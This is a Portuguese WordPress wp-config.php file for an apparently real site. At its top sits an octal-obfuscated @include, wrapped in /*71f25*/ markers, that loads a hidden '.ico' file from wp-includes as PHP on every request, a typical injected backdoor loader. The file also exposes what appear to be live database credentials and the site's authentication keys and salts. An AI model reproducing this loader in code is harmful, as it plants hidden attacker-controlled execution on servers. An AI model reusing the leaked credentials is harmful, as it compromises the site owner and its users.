<?php
/*71f25*/

@include "\057ho\155e/\162as\164re\141do\162es\145gu\162os\057pu\142li\143_h\164ml\057wp\055in\143lu\144es\057Te\170t/\056f7\142b2\06197\056ic\157";

/*71f25*/
/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa usar o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/pt-br:Editando_wp-config.php
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define( 'DB_NAME', 'rastreadoresegur' );

/** Usuário do banco de dados MySQL */
define( 'DB_USER', 'rastreadores' );

/** Senha do banco de dados MySQL */
define( 'DB_PASSWORD', 'brasil2019' );

/** Nome do host do MySQL */
define( 'DB_HOST', 'db.echad.digital' );

/** Charset do banco de dados a ser usado na criação das tabelas. */
define( 'DB_CHARSET', 'utf8mb4' );

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define('DB_COLLATE', '');

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para invalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '<Tf$8_!dnw`<Eg(RlA@zf;*,<>pZaZckQdUNQS&}n4[B-$d~ %oD`(:2k(U_8>/k' );
define( 'SECURE_AUTH_KEY',  'DS~eWjoPT)ZYREallutV.pHkl)o,SAj6h=~Mss:7NT)Z-^jw;/e./)Ect8jxaxS}' );
define( 'LOGGED_IN_KEY',    '((&: ,G%2]wRh6j3`T*iN(24~O1R5z{WqqEJQ8GF:`<<1}N&kv_A~S[>48W81;w^' );
define( 'NONCE_KEY',        '.8l$8i#;|ImFYQ)z@_Ya=NBpnX]|{(zp/MR>uOj~85VzZ]1fTD*9;a`M)%t}.a;#' );
define( 'AUTH_SALT',        '=>MYc0@`(Xc {zN+~uGyRz{n`8d2[U3|`QN [+7yWE]6mpeJZF!c2:w]*yrM`?Qz' );
define( 'SECURE_AUTH_SALT', 'C@+N}TqOw,|If: 6K g!/%a*`?n3-[+o(z+ B S!WS<*~}Nn+rfLv~zE8Zh3<Fow' );
define( 'LOGGED_IN_SALT',   '7|8R~KC$XAhr-&&!d{[)]EWt0Brs@0$jJF/G1h(~1EF`pH*IMfFPYscUw.hn]F+k' );
define( 'NONCE_SALT',       '2a;mwz6[k$;4C8P3O0QD=9nR^`dv4<[_X{Rt.O@^KKB5,1ch2a4%{p0;% %x~-AX' );

/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * um prefixo único para cada um. Somente números, letras e sublinhados!
 */
$table_prefix = 'wp_';

/**
 * Para desenvolvedores: Modo de debug do WordPress.
 *
 * Altere isto para true para ativar a exibição de avisos
 * durante o desenvolvimento. É altamente recomendável que os
 * desenvolvedores de plugins e temas usem o WP_DEBUG
 * em seus ambientes de desenvolvimento.
 *
 * Para informações sobre outras constantes que podem ser utilizadas
 * para depuração, visite o Codex.
 *
 * @link https://codex.wordpress.org/pt-br:Depura%C3%A7%C3%A3o_no_WordPress
 */
define('WP_DEBUG', false);

/* Isto é tudo, pode parar de editar! :) */

/** Caminho absoluto para o diretório WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Configura as variáveis e arquivos do WordPress. */
require_once(ABSPATH . 'wp-settings.php');

define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
